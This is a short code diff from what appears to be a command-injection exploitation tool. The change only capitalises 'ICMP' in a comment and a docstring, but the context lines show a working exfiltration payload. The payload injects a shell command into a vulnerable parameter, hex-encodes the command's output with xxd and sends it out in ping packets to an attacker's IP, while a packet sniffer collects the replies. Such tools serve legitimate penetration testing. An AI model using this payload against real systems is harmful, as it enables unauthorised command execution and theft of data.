@@ -60,7 +60,7 @@ except ImportError:
 
 
 """
-The icmp exfiltration technique: 
+The ICMP exfiltration technique: 
 exfiltrate data using the ping utility.
 
 [1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
@@ -85,7 +85,7 @@ def snif(ip_dst, ip_src):
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
  
 def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
-  # icmp exfiltration payload.
+  # ICMP exfiltration payload.
   payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do ping -p $line -c 1 -s16 -q " + ip_src + "; done")
   
   # Check if defined "--verbose" option.
